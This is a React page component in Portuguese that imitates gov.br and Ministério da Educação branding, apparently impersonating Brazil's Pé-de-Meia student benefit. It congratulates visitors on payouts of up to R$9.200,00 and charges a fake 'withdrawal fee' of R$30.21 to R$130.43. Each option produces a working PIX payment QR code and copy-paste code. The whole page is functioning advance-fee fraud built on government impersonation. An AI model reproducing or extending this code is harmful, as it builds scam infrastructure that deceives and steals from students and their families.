import { useState } from "react";
import i3 from "../../images/i3.png";
import gov1 from '../../images/gov1.png';
import gov2 from '../../images/gov2.png';
import gov3 from "../../images/gov3.png";

const v1 = 30.21;
const v2 = 70.56;
const v3 = 130.43;

type PixResponse = {
    transactionId?: string;
    qrCodeBase64?: string;
    qrCode?: string;
    copyPaste?: string;
    amount?: number;
    error?: string;
};

function CheckMatePage() {
    const sanitizeName = (s: string) => {
        if (!s) return ''
        // keep letters (including accents), spaces, hyphens and apostrophes
        const cleaned = s.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ\s'-]/g, '')
        return cleaned.trim().replace(/\s+/g, ' ')
    }
    const [pixAberto, setPixAberto] = useState(false);
    const [pixCarregando, setPixCarregando] = useState(false);
    const [pixErro, setPixErro] = useState("");
    const [pixPlano, setPixPlano] = useState("");
    const [pixValor, setPixValor] = useState(0);
    const [pixQrUrl, setPixQrUrl] = useState("");
    const [pixCopiaCola, setPixCopiaCola] = useState("");

    const abrirPixDireto = async (nome: string, valor: number) => {
        setPixAberto(true);
        setPixCarregando(true);
        setPixErro("");
        setPixPlano(nome);
        setPixValor(valor);
        setPixQrUrl("");
        setPixCopiaCola("");

        try {
            const payload = {
                name: sanitizeName(nome) || 'Cliente',
                email: "cliente@pedemeia.app",
                amount: valor,
            }

            console.log('[CheckMate] sending pix payload:', payload)

            const response = await fetch("/api/pix/create", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(payload),
            });

            if (!response.ok) {
                const text = await response.text()
                let parsed: PixResponse | null = null
                try {
                    parsed = JSON.parse(text)
                } catch (e) {
                    // ignore
                }
                console.error('[CheckMate] pix create failed:', response.status, text)
                throw new Error((parsed && (parsed.error as string)) || `Erro ao gerar PIX (status ${response.status})`)
            }

            const data = (await response.json()) as PixResponse;

            if (!data.copyPaste || (!data.qrCodeBase64 && !data.qrCode)) {
                throw new Error("Resposta invalida do gateway PIX.");
            }

            setPixCopiaCola(data.copyPaste);
            setPixQrUrl(
                data.qrCodeBase64
                    ? data.qrCodeBase64.startsWith("data:")
                        ? data.qrCodeBase64
                        : `data:image/png;base64,${data.qrCodeBase64}`
                    : data.qrCode || ""
            );
        } catch (error) {
            setPixErro(error instanceof Error ? error.message : "Erro ao gerar PIX.");
        } finally {
            setPixCarregando(false);
        }
    };

    const copiarPix = async () => {
        if (!pixCopiaCola) return;
        await navigator.clipboard.writeText(pixCopiaCola);
    };



    return (
        <div className="flex flex-col min-h-screen">

            <header className=" mt-3 flex flex-row items-center justify-start w-full h-15 bg-[var(--cinza-claro)] rounded-md shadow-md">
                <img src={gov3} alt="gov.br" className="w-19 object-contain ml-5" />
                <div className="w-3 h-15 ml-3 gap-0.5 flex flex-col justify-center items-center rounded-r-md p-2">
                    <div className="w-1.5 h-1.5 bg-[var(--azul-escuro)] rounded-full"></div>
                    <div className="w-1.5 h-1.5 bg-[var(--azul-escuro)] rounded-full"></div>
                    <div className="w-1.5 h-1.5 bg-[var(--azul-escuro)] rounded-full"></div>
                </div>

                <div className="w-[1.5px] h-[70%]  ml-5 bg-[var(--azul-escuro)]"></div>

                <svg xmlns="http://www.w3.org/2000/svg" height="26" viewBox="0 0 24 24" fill="none" stroke="#006eff" strokeWidth="2.75" strokeLinecap="round" strokeLinejoin="round"
                    className="lucide lucide-cookie-icon lucide-cookie ml-5"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5" /><path d="M8.5 8.5v.01" /><path d="M16 15.5v.01" /><path d="M12 12v.01" /><path d="M11 17v.01" /><path d="M7 14v.01" /></svg>

                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"
                    className="icon icon-tabler icons-tabler-outline icon-tabler-percentage-50 text-[#006eff] ml-3"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 21a9 9 0 0 0 0 -18m0 0v18" fill="currentColor" stroke="none" /><path d="M3 12a9 9 0 1 0 18 0a9 9 0 0 0 -18 0" /></svg>

                <svg xmlns="http://www.w3.org/2000/svg" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"
                    className="icon icon-tabler icons-tabler-outline icon-tabler-dice-4  text-[#006eff] ml-3"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 5a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v14a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-14" /><path d="M8 8.5a.5 .5 0 1 0 1 0a.5 .5 0 1 0 -1 0" fill="currentColor" /><path d="M15 8.5a.5 .5 0 1 0 1 0a.5 .5 0 1 0 -1 0" fill="currentColor" /><path d="M15 15.5a.5 .5 0 1 0 1 0a.5 .5 0 1 0 -1 0" fill="currentColor" /><path d="M8 15.5a.5 .5 0 1 0 1 0a.5 .5 0 1 0 -1 0" fill="currentColor" /></svg>

                <button className="flex ml-5 bg-[var(--azul-escuro)] px-4 rounded-4xl h-8 gap-1 text-white justify-center items-center hover:bg-blue-800 transition-colors">
                    <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 0 24 24" fill="currentColor"
                        className="icon icon-tabler icons-tabler-filled icon-tabler-user"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 2a5 5 0 1 1 -5 5l.005 -.217a5 5 0 0 1 4.995 -4.783z" /><path d="M14 14a5 5 0 0 1 5 5v1a2 2 0 0 1 -2 2h-10a2 2 0 0 1 -2 -2v-1a5 5 0 0 1 5 -5h4z" /></svg>
                    <h2>ENTRAR</h2>
                </button>
            </header>



            <main>
                <div className="mt-10 ml-5 flex items-center">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="[5%]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"
                        className="icon icon-tabler icons-tabler-outline icon-tabler-menu-2 text-[#006eff]"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 6l16 0" /><path d="M4 12l16 0" /><path d="M4 18l16 0" /></svg>

                    <p className="font-[350] ml-1"> Ministério da Educação</p>


                    <div className="flex ml-10 gap-3">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor"
                            className="icon icon-tabler icons-tabler-filled icon-tabler-microphone text-[#006eff]"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M19 9a1 1 0 0 1 1 1a8 8 0 0 1 -6.999 7.938l-.001 2.062h3a1 1 0 0 1 0 2h-8a1 1 0 0 1 0 -2h3v-2.062a8 8 0 0 1 -7 -7.938a1 1 0 1 1 2 0a6 6 0 0 0 12 0a1 1 0 0 1 1 -1m-7 -8a4 4 0 0 1 4 4v5a4 4 0 1 1 -8 0v-5a4 4 0 0 1 4 -4" /></svg>

                        <svg xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.9" strokeLinecap="round" strokeLinejoin="round"
                            className="icon icon-tabler icons-tabler-outline icon-tabler-search text-[#006eff]"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 10a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
                    </div>
                </div>
            </main>


            <img src={i3} alt="4 milhões estudantes beneficiados-imagem" className="w-[95%] mx-auto mt-4" />

            <div className="mt-4 w-full h-[0.5px] bg-black"></div>


            <div className="flex flex-col justify-center items-center mt-3">
                <h1>PARABÉNS! ESCOLHA UMA OPÇÃO ABAIXO: </h1>


                <div onClick={() => abrirPixDireto('+ Vendido', v1)}
                    className="mt-6 p-6 bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.55)] flex items-center w-[90%]">
                    <img src={gov3} alt="gov.com.br" className="w-20 mr-15" />
                    <div>
                        <h2>Receber 36x de <span className="font-bold">R$255,55</span></h2>
                        <p>Taxa para saque: <span className="font-bold">R${v1}</span></p>
                    </div>
                </div>

                <div onClick={() => abrirPixDireto('Gov.br', v2)}
                    className="mt-6 p-6 bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.55)] flex items-center w-[90%]">
                    <img src={gov3} alt="gov.com.br" className="w-20 mr-15" />
                    <div>
                        <h2>Receber 12x de <span className="font-bold">R$766,66</span></h2>
                        <p>Taxa para saque: <span className="font-bold">R${v2}</span></p>
                    </div>
                </div>

                <div onClick={() => abrirPixDireto('Gov.br', v3)}
                    className="mt-6 p-6 bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.55)] flex items-center w-[90%]">
                    <img src={gov3} alt="gov.com.br" className="w-20 mr-15" />
                    <div>
                        <h2>Receber 1x de <span className="font-bold">R$9.200,00</span></h2>
                        <p>Taxa para saque: <span className="font-bold">R${v3}</span></p>
                    </div>
                </div>





            </div>

            <footer className="bg-[var(--azul-footer)] flex py-3 justify-center gap-20 mt-auto">
                <img src={gov1} alt="Gov1" className="w-20 object-contain" />
                <img src={gov2} alt="Gov2" className="w-20 object-contain" />
            </footer>

            {pixAberto && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4">
                    <div className="w-full max-w-md rounded-lg bg-white p-5 shadow-xl">
                        <div className="flex items-center justify-between gap-4">
                            <div>
                                <h2 className="text-lg font-bold text-[var(--azul-escuro)]">Pagamento Pix</h2>
                                <p className="text-sm text-gray-700">
                                    {pixPlano} - R$ {pixValor.toFixed(2).replace(".", ",")}
                                </p>
                            </div>
                            <button
                                type="button"
                                onClick={() => setPixAberto(false)}
                                className="rounded-full px-3 py-1 text-xl leading-none text-gray-600 hover:bg-gray-100"
                                aria-label="Fechar Pix"
                            >
                                x
                            </button>
                        </div>

                        {pixCarregando && (
                            <div className="mt-6 rounded-md bg-gray-100 p-4 text-center text-sm text-gray-700">
                                Gerando Pix...
                            </div>
                        )}

                        {pixErro && (
                            <div className="mt-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
                                {pixErro}
                            </div>
                        )}

                        {!pixCarregando && !pixErro && pixQrUrl && (
                            <div className="mt-5 flex flex-col items-center gap-4">
                                <img src={pixQrUrl} alt="QR Code Pix" className="h-56 w-56 rounded-md border object-contain p-2" />
                                <textarea
                                    value={pixCopiaCola}
                                    readOnly
                                    className="h-24 w-full resize-none rounded-md border border-gray-300 p-3 text-xs text-gray-700"
                                />
                                <button
                                    type="button"
                                    onClick={copiarPix}
                                    className="w-full rounded-md bg-[var(--azul-escuro)] px-4 py-3 font-bold text-white hover:bg-blue-800"
                                >
                                    Copiar codigo Pix
                                </button>
                            </div>
                        )}
                    </div>
                </div>
            )}

        </div>
    );
}

export default CheckMatePage;
